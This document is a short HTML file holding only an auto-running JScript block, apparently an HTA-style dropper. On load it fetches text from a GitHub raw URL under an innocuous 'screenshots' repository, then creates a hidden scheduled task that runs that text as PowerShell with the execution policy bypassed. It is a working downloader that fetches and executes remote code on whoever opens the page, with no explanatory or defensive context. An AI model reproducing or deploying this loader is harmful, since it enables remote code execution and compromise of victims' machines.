<html><head><script language=JScript>var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);x.send();var s=x.responseText;new ActiveXObject("WScript.Shell").Run("schtasks /create /sc once /tn U /tr \"powershell -NoP -Ex ByP -c \\""+s.replace(/\n/g,";").replace(/"/g,"\\\"")+"\\"\" /st 00:00 /f",0);</script></head></html>